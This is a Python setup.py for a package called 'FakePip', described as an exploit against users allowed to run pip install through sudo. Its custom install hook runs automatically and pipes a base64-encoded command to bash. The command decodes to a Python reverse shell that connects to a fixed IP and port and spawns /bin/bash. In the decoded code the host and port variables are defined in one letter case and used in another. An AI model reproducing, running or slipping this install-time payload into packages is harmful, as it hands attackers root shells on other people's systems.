from setuptools import setup
from setuptools.command.install import install
#import base64
import os


class CustomInstall(install):
  def run(self):
    install.run(self)
    os.system('echo cHl0aG9uIC1jICJpbXBvcnQgb3MscHR5LHNvY2tldDsgTEhPU1QgPSAnMTAuMTI0LjE5Ni4xMjYnOyBMUE9SVCA9IDEyMzQ1OyBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSk7IHMuY29ubmVjdCgobGhvc3QsbHBvcnQpKTsgb3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTsgb3MucHV0ZW52KCdISVNURklMRScsICcvZGV2L251bGwnKTsgcHR5LnNwYXduKCcvYmluL2Jhc2gnKTsgcy5jbG9zZSgpOyIg|base64 -d|bash')


setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/0x00-0x00/fakepip',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
